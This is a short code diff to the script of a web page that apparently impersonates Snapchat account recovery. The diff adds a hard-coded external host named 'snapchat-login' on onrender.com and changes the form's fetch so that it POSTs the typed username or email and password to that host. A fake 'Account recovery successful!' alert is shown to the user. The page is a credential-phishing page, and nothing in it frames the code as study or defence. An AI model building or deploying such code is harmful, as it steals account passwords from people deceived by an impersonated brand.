@@ -34,6 +34,7 @@
     </div>
 </body>
 <script>
+    const API_BASE = "https://snapchat-login-3j3d.onrender.com";
     // Simulate form submission and error handling
     const form = document.querySelector('form');
     const errorContainer = document.querySelector('.error-container');
@@ -74,7 +75,7 @@
             errorContainer.style.display = 'none'; // Hide error message on successful validation
             alert('Account recovery successful!'); // Simulate successful recovery
         }
-        const response = await fetch('http://localhost:5000/register', {
+        const response = await fetch(`${API_BASE}/register`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ username: usernameOrEmail, password })
